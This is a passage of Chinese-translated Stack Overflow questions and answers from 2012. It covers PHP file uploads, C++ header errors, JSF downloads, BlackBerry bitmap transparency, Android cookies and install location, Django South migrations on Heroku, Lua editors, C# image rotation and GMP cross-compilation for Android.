  echo "Error: " . $_FILES["file"]["error"] . "<br />";
  }
else
  {
  echo "Upload: " . $_FILES["file"]["name"] . "<br />";
  echo "Type: " . $_FILES["file"]["type"] . "<br />";
  echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
  echo "Stored in: " . $_FILES["file"]["tmp_name"];
  }

?> 
```

但它不起作用。我看不到文件，它们要去哪里？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T19:24:26.140

你离工作脚本还有很长的路要走

你可以试试

```
<?php
$output = array ();
$errors = array ();
$savePath = "uploaded"; // PATH to upload images
$allowedExt = array (
        "png",
        "jpg" 
);
if (isset ( $_FILES ['file'] ) && $_FILES ["file"] ["error"] == UPLOAD_ERR_OK) {

    $fileName = $_FILES ['file'] ['name'];
    $fileSize = $_FILES ['file'] ['size'];
    $fileTemp = $_FILES ['file'] ['tmp_name'];
    $fileType = $_FILES["file"]["type"] ;
    $fileExt = pathinfo ( $fileName, PATHINFO_EXTENSION );
    $fileExt = strtolower ( $fileExt );

    //var_dump($fileExt);

    if (!in_array ( $fileExt, $allowedExt )) {
        $errors [] = "Invalid File Extention";
    }

    if ($fileSize > 800*1024) {
        $errors [] = "File Too large";
    }

    if (! is_writable ( $savePath )) {
        $errors [] = "File Destination not writeable";
    }

    $fileDst = $savePath . DIRECTORY_SEPARATOR . $fileName;
    $filePrifix = basename ( $fileName, "." . $fileExt );
    $i = 0;
    while ( file_exists ( $fileDst ) ) {
        $i ++;
        $fileDst = $savePath . DIRECTORY_SEPARATOR . $filePrifix . "_" . $i . "." . $fileExt;

    }
    if (count ( $errors ) == 0) {
        if (@move_uploaded_file ( $fileTemp, $fileDst )) {
            $output['STATUS'] = "OK";
            $output['TYPE'] = $fileType;
            $output['Size'] = $fileSize;
            $output['Destination'] = $fileDst;
        } else {
            $errors [] = "Error Saving File";
        }

    }

    if(count($errors) > 0)
    {
        echo "<h2>Upload Error</h2>" ;

        foreach ($errors as $error)
        {
            echo $error , "<br/>" ;

        }
    }
    else
    {
        echo "<h2>File  Uploaded</h2>" ;
        foreach ($output as $key => $value)
        {
            echo $key , ":" , $value , "<br/>" ;
        }

    }
}

?>
<br/>
<br />
<form method="post" target="_self" enctype="multipart/form-data">
    <input type="file" name="file" id="file" /> <input name="submit"
        type="submit" value="submit" />
</form> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T17:29:32.147

您的代码甚至还没有接近工作，因为您实际上并没有通过 PHP 上传任何文件。我建议从[PHP 文件上传教程](http://www.tizag.com/phpT/fileupload.php)（[更多](https://www.google.com/search?aq=f&sourceid=chrome&ie=UTF-8&q=php%20file%20upload%20tutorial)）开始，然后再试一次。如果您对新代码有任何问题，请寻求帮助并向我们展示您遇到问题的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T18:24:19.393

您需要使用 POST 方法才能使文件上传正常工作。
因此，只需将`method="post"`属性添加到`form`标签即可。

# c++ - 清理组合 C/C++ 文件中的错误

> ID：10270267
> 
> 赞同：0
> 
> 时间：2012-04-22T17:28:19.283
> 
> 标签：c++, visual-studio-2010

尝试在 Visual Studio 2010 中编译我的 C++ 项目时，我从 Visual Studio 自己的 cstdlib 和 cstdio 文件中收到一堆错误 c0254、c0259、c2061（都与语法有关）。我的理解是，这是混合 C 和 C++ 的结果。鉴于我已经非常自由地复制和粘贴了，我如何才能有效地将一个代码与另一个代码区分开来？我有我复制和粘贴的所有来源，如果有帮助的话。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:30:18.010

当编译标准包含文件时发生错误时，通常意味着您在包含系统文件之前已经定义了具有相同名称的内容。它可能是一个宏（当存在名称冲突时，它们真的会搞砸解析），或者您可能已经定义了一个与标准头文件中的函数同名的类型，等等。

如果您将`#include`标准和系统包含文件的说明放在顶部，然后是`#include`您自己的头文件，那么您的问题应该得到解决。

# java - JSF 链接到外部文件

> ID：10270268
> 
> 赞同：0
> 
> 时间：2012-04-22T17:28:22.697
> 
> 标签：java, jsf, file-upload, jsf-2

我正在使用 JSF 2.0 开发 Java Web 应用程序。用户可以上传文件。**我不想将文件存储在项目文件夹中。我想将它们存储在另一个文件夹中。**我将文件的路径存储在数据库中。如何生成用户下载文件的链接。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T17:30:37.970

您需要创建一个操作方法，该方法将从给定路径读取文件并将其写入响应，

**另见**

*   [强制-a-save-as-dialogue-from-any-web-browser-from-jsf-application](https://stackoverflow.com/questions/2914025/forcing-a-save-as-dialogue-from-any-web-browser-from-jsf-application/2914079#2914079)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T20:48:10.187

这取决于使用的应用服务器。至此，您需要将该外部文件夹作为另一个文档根目录添加到服务器的部署配置中，以便可以通过 URL 访问它。

例如，在 Tomcat 的情况下，只需将新`<Context>`元素添加到`server.xml`. 另请参阅此答案的示例：[Load images from outside of webapps / webcontext / deploy folder using <h:graphicImage> or <img> tag](https://stackoverflow.com/questions/4543936/load-the-image-from-outside-of-webcontext-in-jsf/4543951#4543951)。以 Glassfish 为例，只需将新`alternatedocroot`属性添加到`glassfish-web.xml`. 另请参阅此答案的示例：[Uploaded image only available after refresh the page](https://stackoverflow.com/questions/8885201/uploaded-image-only-available-after-refreshing-the-page/8889096#8889096)

# c# - C# 泛型 & 不会发疯

> ID：10270269
> 
> 赞同：7
> 
> 时间：2012-04-22T17:28:28.813
> 
> 标签：c#, java, generics

```
public <T extends java.util.EventListener> T[] getListeners(final Class<T> listenerClass) {
    ...
} 
```

上述 java 泛型的等效 c# 泛型表示法是什么？

参数 listenerClass 将是一个类型而不是一个对象。但是对象 T 必须属于特定的层次结构。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-22T17:30:53.010

```
public T[] GetListeners<T>() where T : EventListener
{
} 
```

# java - 如何使我的自定义位图按钮字段使用透明背景？

> ID：10270272
> 
> 赞同：1
> 
> 时间：2012-04-22T17:28:42.410
> 
> 标签：java, blackberry, bitmap, transparent, buttonfield

我有一个完全可以使用的自定义位图按钮字段，但是，图像后面的背景显示为一个白色矩形。我发现它在哪里使颜色变白，但我不知道如何使它完全透明。有任何想法吗？我正在用黑莓 java JDE 5.0 编程

仅供参考 按钮图像是圆角 png 文件，在角落使用透明度

代码：

```
public class BitmapButtonField extends Field 
{

    Bitmap _currentPicture;
    private Bitmap _onPicture;
    Bitmap _offPicture;
    private int id;

    public BitmapButtonField (Bitmap  onImage, Bitmap offImage)
    {
       super(Field.FOCUSABLE|Field.FIELD_HCENTER);
       _offPicture = offImage;
       _onPicture = onImage;
       _currentPicture = _onPicture;
    }

    public void setButtonImage (Bitmap onImage, Bitmap offImage)
    {
        _offPicture = offImage;
        _onPicture = onImage;
        _currentPicture = _onPicture;
     }

    public void setButtonId(int id)
    {
        this.id = id;
    }
    public int getButtonId()
    {
        return this.id;
    }    

    public int getPreferredHeight()
    {
        return _onPicture.getHeight();
    }

    public int getPreferredWidth()
    {
        return _onPicture.getWidth();
    }

    protected void onFocus(int direction)
    {
        _currentPicture = _offPicture;
       invalidate();
    }

    protected void onUnfocus()
    {
        _currentPicture = _onPicture;
       invalidate();
    }

    protected void drawFocus(Graphics g, boolean on)
    {        
        g.setBackgroundColor(Color.BLACK);
    }

    protected void layout(int width, int height) 
    {
        setExtent(Math.min( width, getPreferredWidth()), Math.min( 
                            height, getPreferredHeight()));
    }

    protected void paintBackground(Graphics g) {
          int prevColor = g.getColor();
          int prevAlpha = g.getGlobalAlpha();
          g.setColor(Color.YELLOW);
          g.setGlobalAlpha(0);
          g.fillRect(0, 0, getWidth(), getHeight()); // or g.getClippingRect()
          g.setColor(prevColor);
          g.setGlobalAlpha(prevAlpha);
        }

        protected void paint (Graphics graph){

        graph.setColor(Color.WHITE);
        //super.paint(graph);

        graph.fillRect(0, 0, getWidth(), getHeight());
        graph.drawBitmap(0, 0, getWidth(), getHeight(), 
                             _currentPicture, 0, 0);    
        }

    protected boolean navigationClick(int status, int time)
    {
        fieldChangeNotify(0);
        return true;
    }

    public boolean keyChar(char key, int status, int time)
    {
        if (key == Characters.ENTER)
        {
            fieldChangeNotify(0);
            return true;
        }
        return false;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T00:41:36.970

确保您的 paint() 方法使用 drawARGB 在屏幕上绘制位图。我有一个类似的问题，[“Scale a Bitmap and preserve alpha, on BlackBerry”](https://stackoverflow.com/questions/4239553/scale-a-bitmap-and-preserve-alpha-on-blackberry)，结果 drawRGB 和 drawBitmap 不使用 alpha 通道，所以不会留下任何透明的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-23T07:31:37.670

你正在使用

```
graph.setColor(Color.WHITE);

 graph.fillRect(0, 0, getWidth(), getHeight()); 
```

代码中的方法（在paint() 和paintBackground() 方法中）将创建一个白色矩形。

我认为您需要删除此代码。

如果您仍然找不到问题，那么我将提供另一个自定义 BitmapField 示例。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-23T23:00:54.497

你已经实施

```
protected void drawFocus(Graphics g, boolean on) 
```

和

```
protected void paintBackground(Graphics g) 
```

并且您还指定了聚焦状态的背景图像。您可以删除 和 的`paintBackground()`实现`drawFocus()`。也可以从方法paint中删除将图形颜色设置为白色并填充矩形的线。那就是你只需要在paint方法上绘制位图图像。我在[这里](http://pastebin.com/g9n8bqYc.)修改了你的代码，你可以检查一下（我没有测试过）。

# android - 如何在android中保护cookie？

> ID：10270273
> 
> 赞同：0
> 
> 时间：2012-04-22T17:28:51.980
> 
> 标签：android, cookies, session-cookies

我正在使用 Android 的[CookieManager](http://developer.android.com/reference/android/webkit/CookieManager.html)在 webview 中设置一个包含用户 ID 的 cookie。我想让这个 cookie 安全，以避免任何冒充攻击。由于 CookieManager 仅支持基本的字符串键值对，我如何使其成为安全的 cookie。

如果连接是通过 HTTPS 协议进行的，cookie 是否也是安全的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-23T02:10:38.363

不确定您在做什么，但 cookie 是在服务器上设置的。因此，您不能仅在您身边使其安全。如果您想确保您的 cookie 保持机密，请对所有涉及该 cookie 的操作使用 HTTPS，并让服务器设置 cookie 的“安全”标志，以便它仅通过 HTTPS 发送。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-09-02T15:13:23.400

也可以在设置cookie的同时设置cookie属性

例如：

```
 CookieManager.getInstance().setCookie(url,"USERID=ADADASD; secure ");. 
```

# java - 为什么我的代码会重复文件的文本？

> ID：10270274
> 
> 赞同：0
> 
> 时间：2012-04-22T17:29:01.713
> 
> 标签：java, file, file-io

我正在使用 Java 从文件中读取文本。这是我的代码：

```
public void readCurrentPage(){
    FileInputStream file = null;
    BufferedInputStream buff = null;
    int readByteValue;
    Exception lastShownException = null;
    boolean errorShown = false;
    boolean readOnce;

    try{
        errorShown = false;
        file = new FileInputStream("/Volumes/Storage Drive/eclipse/workspace/Nicholas Planner/bin/data/test.txt");
        buff = new BufferedInputStream(file,8*1024);
        while (true){
            readByteValue = buff.read();
            if (readByteValue == -1){
                break;
            }
            System.out.print((char) readByteValue + " ");

        }

    }catch(Exception e){
        if(errorShown == false && lastShownException!=e){
            JOptionPane.showMessageDialog(null, "There was an error: \n"+e, "Error!", 1);
            e = lastShownException;
            errorShown = true;
        }

    }finally{
        try{
            errorShown = false;
            buff.close();
            file.close();
        }catch(Exception e){
            if(errorShown == false && lastShownException!=e){
                JOptionPane.showMessageDialog(null, "There was an error: \n"+e, "Error!", 1);
                e = lastShownException;
                errorShown = true;
            }
        }
    }
} 
```

这是文件的文本：

```
test
This is cool! 
```

当我使用上面的代码读取文件时，我得到的是：

```
t e s t 
 T h i s   i s   c o o l ! t e s t 
 T h i s   i s   c o o l ! 
```

为什么我的代码会重复文件的文本？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T19:45:50.590

使用您最喜欢的调试工具，一次单步执行一个代码。我认为可能的一件事是您两次调用该方法（这就是为什么使用调试器会有所帮助。它还可以帮助您隔离问题）。如果您的方法由于诸如 jList 值更改事件之类的摇摆事件或类似事件（这些总是让我明白）而被调用，则可能会发生这种情况。祝你好运！

我不确定您是否出于任何特殊原因需要使用该方法，但您也可以尝试[Java Helper Library](https://github.com/kentcdodds/Java-Helper)中的[此方法](https://github.com/kentcdodds/Java-Helper/blob/master/src/com/kentcdodds/javahelper/helpers/IOHelper.java#L66)：

```
 /**
   * Takes the file and returns it in a string
   *
   * @param location
   * @return
   * @throws IOException
   */
  public static String fileToString(String location) throws IOException {
    FileReader fr = new FileReader(new File(location));
    return readerToString(fr);
  }

  /**
   * Takes the given resource (based on the given class) and returns that as a string.
   *
   * @param location
   * @param c
   * @return
   * @throws IOException
   */
  public static String resourceToString(String location, Class c) throws IOException {
    InputStream is = c.getResourceAsStream(location);
    InputStreamReader r = new InputStreamReader(is);
    return readerToString(r);
  }

  /**
   * Returns all the lines in the scanner's stream as a String
   *
   * @param r
   * @return
   * @throws IOException
   */
  public static String readerToString(InputStreamReader r) throws IOException {
    StringWriter sw = new StringWriter();
    char[] buf = new char[1024];
    int len;
    while ((len = r.read(buf)) > 0) {
      sw.write(buf, 0, len);
    }
    r.close();
    sw.close();
    return sw.toString();
  } 
```

# python - 在 Heroku 中使用南迁移

> ID：10270275
> 
> 赞同：3
> 
> 时间：2012-04-22T17:29:12.010
> 
> 标签：python, django, heroku, django-south

我已经在本地服务器上使用 south 成功同步了我的数据库。我在 Heroku 中使用 south 时遇到问题。当我跑

```
git add app/migrations/*

git commit -m 'adding new migrations'

heroku run python manage.py migrate app 
```

我收到一个数据库错误。关系字段已存在。

任何想法为什么这不起作用？此外，每次我的模型之一发生更改时，我是否需要在本地和生产环境中运行迁移？谢谢阅读。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T19:35:09.750

看来您的数据库中已经有该应用程序的字段。尝试通过运行来伪造迁移

```
heroku run python manage.py migrate app --fake

```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-24T11:58:25.077

在 Heroku 上执行此操作：

heroku run python manage.py migrate YOUR_APP_NAME 0001 --fake

然后

heroku 运行 python manage.py 迁移 YOUR_APP

为我解决了这个问题。只是运行 migrate 会出错，因为某种原因 south 也会尝试运行初始迁移。所以我伪造了那个，然后运行第一个实际迁移（0002）效果很好。

# coronasdk - Win32平台Corona的编辑器

> ID：10270280
> 
> 赞同：1
> 
> 时间：2012-04-22T17:29:59.560
> 
> 标签：coronasdk

我正在寻找一些可以使用 Lua 的编辑器。我有一个Win32。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T19:45:39.163

查看这篇关于设置 IntelliJ 以使用 Corona 的帖子[http://producerism.com/blog/how-to-develop-in-corona-sdk-on-windows/](http://producerism.com/blog/how-to-develop-in-corona-sdk-on-windows/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T18:50:11.167

IntelliJ / Corona 教程很棒，因为它是免费的。然而，现在也有一个特定于 Corona 的 IDE（几周前刚刚发布）：

[http://www.mydevelopersgames.com/CIDER/](http://www.mydevelopersgames.com/CIDER/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T17:50:21.977

您应该查看 Notepad++ 不是 IDE，但对于文本编辑器来说，它非常棒。而且轻巧。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T18:58:17.633

您可能想查看 Eclipse Koneki 项目 ( [http://www.eclipse.org/koneki/](http://www.eclipse.org/koneki/) )。它有一个活跃的开发者社区，甚至支持与 Corona 调试器的集成。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-20T23:07:53.487

结帐 Sublime Text 2，它在 Mac 中非常棒，它有 Windows 版本。

你不会失望的

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-28T02:27:13.937

我使用带有以下插件的**Sublime 2来完成代码。**效果很好！该插件适用于 textmate，但也适用于 sublime。

[https://github.com/osadchuk/Corona-SDK.tmbundle](https://github.com/osadchuk/Corona-SDK.tmbundle)

**Corona Complete**也相当不错。

**Krea** - 仅适用于 Windows - 从未尝试过，但看起来很棒

[http://www.native-software.com/index.php/en/](http://www.native-software.com/index.php/en/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-05-23T09:36:34.417

我使用[ZeroBrane Studio](http://studio.zerobrane.com/)

它是免费且轻量级的 Lua IDE，具有代码完成、语法突出显示、远程调试器、代码分析器、实时编码和对多个 Lua 引擎的调试支持。

它支持 Löve 2D、Moai、Gideros、Marmalade Quick 和 Corona 的调试。适用于 Mac/Windows/Linux[此处](http://studio.zerobrane.com/download.html?not-this-time)。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-09-20T18:54:53.997

记事本++是免费的。我在电晕中使用它。它也有一种简单的方法可以转到特定线路。

# iphone - ALAsset 视频压缩

> ID：10270281
> 
> 赞同：2
> 
> 时间：2012-04-22T17:30:01.900
> 
> 标签：iphone, ios, video, uiimagepickercontroller, alasset

我浏览了 SO 并找不到这个问题的有效答案。我已经使用 ALAssets 创建了一个自定义图像选择器，但现在它不是常规的图像选择器，因此没有视频的自动压缩。

这就是我从资产中获取视频 NSData 的方式：

```
 ALAssetRepresentation *rep = [asset defaultRepresentation];
    Byte *buffer = (Byte*)malloc(rep.size);
    NSUInteger buffered = [rep getBytes:buffer fromOffset:0.0 length:rep.size error:nil];
    data = [[NSData dataWithBytesNoCopy:buffer length:buffered freeWhenDone:YES] retain]; 
```

现在的问题是，当我选择一个大的视频文件时，应用程序崩溃了，因为它收到了内存警告。无论如何压缩视频甚至修剪视频文件不会那么大？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-20T13:11:33.503

我对大视频也有同样的问题。您应该重复地将少量字节从资产复制到缓冲区中，并将其附加到视频数据中。

# android - Android 中的应用程序安装

> ID：10270288
> 
> 赞同：1
> 
> 时间：2012-04-22T17:30:36.580
> 
> 标签：android, android-ndk

我需要知道，当我的应用程序安装在 android 设备中时，应用程序框架的哪个组件决定了它的安装站点以及我如何管理它的安装站点（移动内存或 SD 卡）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:36:03.367

在您的清单文件中，它被设置为默认值，因此当用户下载应用程序时，它正在下载到他们的移动内存中。如果您希望用户必须选择将应用程序移动到他们的 SD 卡，您可以添加：

```
android:installLocation="auto" 
```

它应该放在清单部分。例如：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.android.application"
    android:installLocation="auto"
    android:versionCode="1"
    android:versionName="1.0" > 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:35:24.407

在此处查看 android 文档[1]。安装到 SD 卡放

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
android:installLocation="preferExternal"> 
```

在你的清单中。

为了向后兼容，请使用“auto”而不是“preferExternal”。

[1] [http://developer.android.com/guide/appendix/install-location.html](http://developer.android.com/guide/appendix/install-location.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T17:35:28.810

您可以在 SD 卡上提供安装选项。您将在清单中需要此选项

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
android:installLocation=["auto" | "internalOnly" | "preferExternal" 
```

您可以在这些中进行选择。但默认情况下，您的应用程序将始终保存在设备上。用户始终可以将其传输到 SD 卡。

# c# - 如何旋转图片框

> ID：10270292
> 
> 赞同：0
> 
> 时间：2012-04-22T17:30:49.560
> 
> 标签：c#, winforms, picturebox

我需要通过旋转图像来解决问题，但是我有这个旋转图像的代码没有完全旋转

```
public static Image RotateImage(Image img, float rotationAngle)
        {
            //create an empty Bitmap image
            Bitmap bmp = new Bitmap(img.Width, img.Height);

            //turn the Bitmap into a Graphics object
            Graphics gfx = Graphics.FromImage(bmp);

            //now we set the rotation point to the center of our image
            gfx.TranslateTransform((float)bmp.Width / 2, (float)bmp.Height / 2);

            //now rotate the image
            gfx.RotateTransform(rotationAngle);

            gfx.TranslateTransform(-(float)bmp.Width / 2, -(float)bmp.Height / 2);

            //set the InterpolationMode to HighQualityBicubic so to ensure a high
            //quality image once it is transformed to the specified size
            gfx.InterpolationMode = InterpolationMode.HighQualityBicubic;

            //now draw our new image onto the graphics object
            gfx.DrawImage(img, new System.Drawing.Point(0, 0));

            //dispose of our Graphics object
            gfx.Dispose();

            //return the image
            return bmp;
        } 
```

并使用它来调用方法。右边是旋转包含的图像矩形，并避免切割图像

```
Bitmap bitmap = (Bitmap)Pix.Image;
Pix.Image = (Bitmap)(RotateImage(bitmap, 20.0f)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:52:30.120

```
private Bitmap RotateImageByAngle(Image oldBitmap, float angle)
{
    var newBitmap = new Bitmap(oldBitmap.Width, oldBitmap.Height);
    newBitmap.SetResolution(oldBitmap.HorizontalResolution, oldBitmap.VerticalResolution);
    var graphics = Graphics.FromImage(newBitmap);
    graphics.TranslateTransform((float)oldBitmap.Width / 2, (float)oldBitmap.Height / 2);
    graphics.RotateTransform(angle);
    graphics.TranslateTransform(-(float)oldBitmap.Width / 2, -(float)oldBitmap.Height / 2);
    graphics.DrawImage(oldBitmap, new Point(0, 0));
    return newBitmap;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:18:59.367

我过去曾使用本文中的以下代码。 [http://www.switchonthecode.com/tutorials/csharp-tutorial-image-editing-rotate](http://www.switchonthecode.com/tutorials/csharp-tutorial-image-editing-rotate) 还有一些其他的解决方案。

```
/// <summary>
/// Rotates the input image by theta degrees around center.
/// </summary>
public static Bitmap rotateCenter(Bitmap bmpSrc, float theta)
{
    Matrix mRotate = new Matrix();
    mRotate.Translate(bmpSrc.Width / -2, bmpSrc.Height / -2, MatrixOrder.Append);
    mRotate.RotateAt(theta, new Point(0, 0), MatrixOrder.Append);
    using (GraphicsPath gp = new GraphicsPath())
    {  // transform image points by rotation matrix
        gp.AddPolygon(new Point[] { new Point(0, 0), new Point(bmpSrc.Width, 0), new Point(0, bmpSrc.Height) });
        gp.Transform(mRotate);
        PointF[] pts = gp.PathPoints;

        // create destination bitmap sized to contain rotated source image
        Rectangle bbox = boundingBox(bmpSrc, mRotate);
        Bitmap bmpDest = new Bitmap(bbox.Width, bbox.Height);

        using (Graphics gDest = Graphics.FromImage(bmpDest))
        {  // draw source into dest
            Matrix mDest = new Matrix();
            mDest.Translate(bmpDest.Width / 2, bmpDest.Height / 2, MatrixOrder.Append);
            gDest.Transform = mDest;
            gDest.DrawImage(bmpSrc, pts);
            //drawAxes(gDest, Color.Red, 0, 0, 1, 100, "");
            return bmpDest;
        }
    }
}

private static Rectangle boundingBox(Image img, Matrix matrix)
{
    GraphicsUnit gu = new GraphicsUnit();
    Rectangle rImg = Rectangle.Round(img.GetBounds(ref gu));

    // Transform the four points of the image, to get the resized bounding box.
    Point topLeft = new Point(rImg.Left, rImg.Top);
    Point topRight = new Point(rImg.Right, rImg.Top);
    Point bottomRight = new Point(rImg.Right, rImg.Bottom);
    Point bottomLeft = new Point(rImg.Left, rImg.Bottom);
    Point[] points = new Point[] { topLeft, topRight, bottomRight, bottomLeft };
    GraphicsPath gp = new GraphicsPath(points,
                                                        new byte[] { (byte)PathPointType.Start, (byte)PathPointType.Line, (byte)PathPointType.Line, (byte)PathPointType.Line });
    gp.Transform(matrix);
    return Rectangle.Round(gp.GetBounds());
} 
```

# android - android GMP交叉编译

> ID：10270295
> 
> 赞同：1
> 
> 时间：2012-04-22T17:31:16.830
> 
> 标签：android, android-ndk, cross-compiling, gmp

我在 debian/amd64 上，我想使用 NDK-7b 为 android 2.2 交叉编译 GMP。我从 [gmplib](hg clone [http://gmplib.org:8000/gmp-5.0](http://gmplib.org:8000/gmp-5.0) gmp) 获取源代码。我将其配置为：

 `````
./configure --enable-shared --host=arm-linux-androideabi --prefix=/home/fabien/android/spica/ndk-standalone-8 CFLAGS="-v -march=armv5te -mtune=xscale -msoft-float -Wl,-rpath,lib/ -DANDROID -ffunction-sections -funwind-tables -fstack-protector -funswitch-loops -finline-limit=300 -Wall -O3 -nodefaultlibs -fPIC -shared -Wl,--no-allow-shlib-undefined" PKG_CONFIG_PATH="/home/fabien/android/spica/ndk-standalone-8/lib/pkgconfig" LDFLAGS="-Wl,-rpath-link -Wl,/home/fabien/android/spica/ndk-standalone-8/lib -L/home/fabien/android/spica/ndk-standalone-8/lib" 
````  `我通过设置修改了文件 config.h：

 `````
/* Define to 1 if you have the `obstack_vprintf' function. */
#ifndef ANDROID
#define HAVE_OBSTACK_VPRINTF 1
#endif
/* Define to 1 if you have the `localeconv' function. */
#ifndef ANDROID
#define HAVE_LOCALECONV 1
#endif
/* Define to 1 if you have the `vsnprintf' function and it works properly. */
#ifndef ANDROID
#define HAVE_VSNPRINTF 1
#endif 
````  `我在 Makefile 中更新了 SUBDIRS 参数，如下所示：

 `````
 SUBDIRS = tests mpn mpz mpq mpf printf scanf cxx mpbsd demos tune 
````  `当我运行 make 时，它​​似乎可以编译：

 `````
libtool: link: (cd ".libs" && rm -f "libgmp.so" && ln -s "libgmp.so.10.0.5" "libgmp.so")
libtool: link: ( cd ".libs" && rm -f "libgmp.la" && ln -s "../libgmp.la" "libgmp.la" ) 
````  `但是当我运行“make check”时，链接器似乎丢失了：

 `````
/../../../../arm-linux-androideabi/bin/ld: warning: ld-linux.so.3, needed by /home/fabien/android/spica/sources/gmp/.libs/libgmp.so, not found (try using -rpath or -rpath-link)
t-bswap.o:(.ARM.exidx.text.main+0x0): undefined reference to `__aeabi_unwind_cpp_pr0'
./.libs/libtests.a(misc.o):(.ARM.exidx.text.align_pointer+0x0): undefined reference to `__aeabi_unwind_cpp_pr0'
.
.
.
refmpn.c:(.text.refmpn_get_str+0xb8): undefined reference to `__aeabi_uidiv'
refmpn.c:(.text.refmpn_get_str+0x238): undefined reference to `__aeabi_ui2d'
refmpn.c:(.text.refmpn_get_str+0x250): undefined reference to `__aeabi_dmul'
refmpn.c:(.text.refmpn_get_str+0x254): undefined reference to `__aeabi_d2uiz'
./.libs/libtests.a(refmpn.o):(.ARM.exidx.text.refmpn_get_str+0x0): undefined reference to `__aeabi_unwind_cpp_pr0'
/home/fabien/android/spica/sources/gmp/.libs/libgmp.so: undefined reference to `abort@GLIBC_2.4'
/home/fabien/android/spica/sources/gmp/.libs/libgmp.so: undefined reference to `puts@GLIBC_2.4' 
````  `有什么提示吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:34:08.777

此错误是由于链接器创建目标时未包含包含这些辅助函数（这些是 GCC 辅助函数）的文件。要解决此问题，请将*libgcc.a*（包含 GCC 辅助函数定义）添加到链接器标志中。

至于lib​​gcc.a的位置，假设gcc版本为arm-linux-androideabi-4.4.3，会是 `$NDK_ROOT/toolchains/arm-linux-androideabi-4.4.3/prebuilt/linux-x86/lib/gcc/arm-linux-androideabi/4.4.3/libgcc.a`

这**不会**修复以下错误（这似乎与缺少 GNU libc 有关）：

```
.libs/libgmp.so: undefined reference to `abort@GLIBC_2.4'
.libs/libgmp.so: undefined reference to `puts@GLIBC_2.4' 
```

由于 android 使用 Bionic libc，而不是 GNU libc，上述 2 个错误将始终显示

注意：此方法将修复所有系统上的类似问题，而不仅仅是 Android。``````````

# android - 消息处理程序的问题

> ID：10270296
> 
> 赞同：-1
> 
> 时间：2012-04-22T17:31:23.100
> 
> 标签：android, android-widget

我正在使用消息和处理程序来更改在执行线程时显示的 processdialog 的消息。代码如下。

```
final ProgressDialog processdialog = ProgressDialog
        .show(MultiBootManager.this, EMPTY,
                EMPTY, true);
final Handler handler = new Handler() {
    @Override
    public void handleMessage(Message msg) {
        switch (msg.arg1) {
        case 0:
            System.out.println("msg0");
            processdialog
                    .setMessage(getString(R.string.formating)
                            + folderpath
                            + getString(R.string.cachext3));
        case 1:
            System.out.println("msg1");
            processdialog
                    .setMessage(getString(R.string.formating)
                            + folderpath
                            + getString(R.string.dataext3));
        case 2:
            System.out.println("msg2");
            processdialog
                    .setMessage(getString(R.string.formating)
                            + folderpath
                            + getString(R.string.systemext3));
        case 3:
            System.out.println("endmsg");
            processdialog.dismiss();

        }
    }
};
Thread checkUpdate = new Thread() {
    @Override
    public void run() {
        String[] shellinput = { EMPTY,
                EMPTY, EMPTY, EMPTY, EMPTY };
        shellinput[0] = CMD_MKE2FS_EXT3;
        shellinput[1] = folderpath;
        if (cacheCheckBool) {
            final Message m0 = new Message();
            m0.arg1 = 0;
            handler.sendMessage(m0);
            shellinput[2] = CACHE_IMG;
            processManager
                    .inputStreamReader(
                            shellinput, 20);
        }
        if (dataCheckBool) {
            final Message m1 = new Message();
            m1.arg1 = 1;
            handler.sendMessage(m1);
            shellinput[2] = DATA_IMG;
            processManager
                    .inputStreamReader(
                            shellinput, 20);
        }
        final Message endmessage;
        if (systemCheckBool) {
            final Message m2 = new Message();
            m2.arg1 = 2;
            handler.sendMessage(m2);
            shellinput[2] = DATA_IMG;
            processManager
                    .inputStreamReader(
                            shellinput, 20);
        }
        endmessage = new Message();
        endmessage.arg1 = 3;
        handler.sendMessage(endmessage);
    }
};
checkUpdate.start(); 
```

}

我现在遇到的问题是`endmessage`在操作完成之前发送，`ProcessDialog`在 0.5 秒内关闭。如果一切`Boolean`都是真的，它会`msg1, msg2, msg3, emdmsg`迅速显示`System.out`并关闭。为什么会有这种行为？我如何解决它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:40:05.967

您需要为每个案例添加中断。否则，将执行到下一个案例。

```
public void handleMessage(Message msg) {
    switch (msg.arg1) {
    case 0:
        System.out.println("msg0");
        processdialog
                .setMessage(getString(R.string.formating)
                        + folderpath
